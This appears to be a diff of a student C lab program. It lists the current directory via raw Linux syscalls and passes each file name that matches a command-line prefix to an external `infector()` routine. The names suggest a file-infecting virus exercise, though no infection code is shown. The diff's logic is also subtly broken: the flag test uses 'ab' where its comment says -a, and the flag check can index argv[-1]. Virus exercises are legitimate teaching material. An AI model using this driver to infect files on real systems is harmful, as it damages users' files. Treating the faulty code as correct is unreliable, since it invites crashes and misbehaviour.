@@ -6,70 +6,102 @@
 #define SYS_OPEN 5
 #define SYS_CLOSE 6
 #define SYS_ISEEK 19
+#define SYS_GETDENTS 141
+#define SYS_GETCWD 0xb7
+
 #define STDIN 0
 #define STDOUT 1
 #define STDERR 2
+
+#define O_RD 0
+#define O_WR 1
+#define O_RDRW 2
+#define O_CREAT 64
+#define O_DIRECTORY 4
+#define O_APPEND 0x400
+
+
+
+#define SEEK_SET 0
+#define SEEK_CUR 1
+#define SEEK_END 2
+
 #define EOF 4
+
 #define BUFFER_SIZE 8192
 
 typedef struct linux_dirent {
     unsigned long  d_ino;     /* Inode number */
     unsigned long  d_off;     /* Offset to next linux_dirent */
     unsigned short d_reclen;  /* Length of this linux_dirent */
-    char*          d_name;  /* Filename (null-terminated) */
+    char          d_name[1];  /* Filename (null-terminated) */
                         /* length is actually (d_reclen - 2 -
                            offsetof(struct linuxma_dirent, d_name) */
 } linux_dirent;
 
+typedef struct link link;
+struct link {
+    link *next_dirent;
+    linux_dirent *dir;
+};
+
 extern int system_call(int op_code, ...); 
-extern void infection(int p);
-extern void infector(char* p); 
- 
-/* given file descriptor - return the size of the file in bytes. */
+
+int sys_write(int fd, const char *output_buff, int number_of_bytes_to_write);
+void sys_error_exit(const char * err_msg);
+
+/* given file descributor - return the size of the file in bytes. */
+extern void infection(int fd);
+extern void infector(char * str);
 
 int main (int argc , char* argv[], char* envp[]){
-/*   int input_fd = STDIN; */
-/*   int output_fd = STDOUT; */
-  char buffer[BUFFER_SIZE];
-  int  directory_fd;
-  int prefix = 0;
-  struct linux_dirent *dir; 
-  int directory_size;
 
-  int i;
-  for(i = 1; i < argc; i++) 
-    if(strncmp("-a", argv[i], 2) == 0){ 
-      prefix = 1;
-      system_call(STDOUT, "File Opening 1234", 17);
-    }
-  
-  directory_fd = system_call(5, ".", 0, 0777);     /*opening current dir*/
-  if (directory_fd < 0) {
-    system_call(STDOUT, "File Opening Fail", 17);
-    return system_call(SYS_EXIT,0x55);
+  int buff_size = 20000;
+  char buffer[buff_size];
+  int  curr_pos, curr_dir, dir_size, a_flag = -1, i = 1;
+  struct linux_dirent *dirp;
+      
+  for(i = 1; i < argc; i++){   
+    if(strncmp("ab", argv[i], 2) == 0) {a_flag = i;}  /*making sure there is a -a*/
   }
 
-  else {
-    directory_size = system_call(141, directory_fd, buffer, BUFFER_SIZE); /*getting num of bytes readed in curr dir by sys_getdents*/
-    system_call(STDOUT,itoa(directory_size),strlen(itoa(directory_size)));
-    int curr_pos;
-    for(curr_pos = 0; curr_pos < directory_size;){
-      system_call(STDOUT, "File Opening 4321", 17);
-      dir = (struct linux_dirent *)(buffer + curr_pos);
-      if(prefix != 0){
-        if(strncmp(dir->d_name, argv[prefix] + 2, strlen(argv[prefix] + 2)) == 0){
-          system_call(STDOUT, dir->d_name, strlen(dir->d_name));
-          system_call(STDOUT, "\n", 1);
-          infector(dir->d_name);
+  /*opening current dir*/
+  curr_dir = system_call(SYS_OPEN,".", O_RD, 0777); 
+  /*getting num of bytes readed in curr dir by sys_getdents*/
+  dir_size = system_call(SYS_GETDENTS,curr_dir, buffer, buff_size); 
+
+  if(dir_size < 0 || curr_dir < 0)
+    sys_error_exit("Directory Opening Fail"); 
+
+  for(curr_pos = 0; curr_pos < dir_size;){
+    dirp = (struct linux_dirent *)(buffer + curr_pos);
+
+    sys_write(STDOUT, dirp->d_name, strlen(dirp->d_name));  /*write the file name*/
+    sys_write(STDOUT, "\n", 1);
+
+    if(a_flag != 0){
+        if(strncmp(dirp->d_name, argv[a_flag] + 2, strlen(argv[a_flag] + 2)) == 0){
+            infector(dirp->d_name);
         }
-      }
-      else{
-        system_call(STDOUT, dir->d_name, strlen(dir->d_name));
-        system_call(STDOUT, "\n", 1);
-      }
-      curr_pos += dir->d_reclen;
     }
+    curr_pos += dirp->d_reclen;
   }
+  return 0;  
+}
 
-  return 0;
+
+/*sys write gets the number of bytes its spposed to write and an output*/
+int sys_write(int fd, const char *output_buff, int number_of_bytes){
+    int ret=-1;
+    ret = system_call(SYS_WRITE,fd,output_buff,number_of_bytes);
+    if (ret < 0 || (ret==0 && number_of_bytes>0)){
+      sys_error_exit("Fail to write to file");
+    }
+    return ret;
+}
+
+
+void sys_error_exit(const char * err_msg){
+  sys_write(STDOUT,err_msg,strlen(err_msg));
+  system_call(SYS_EXIT,0x55);
 }
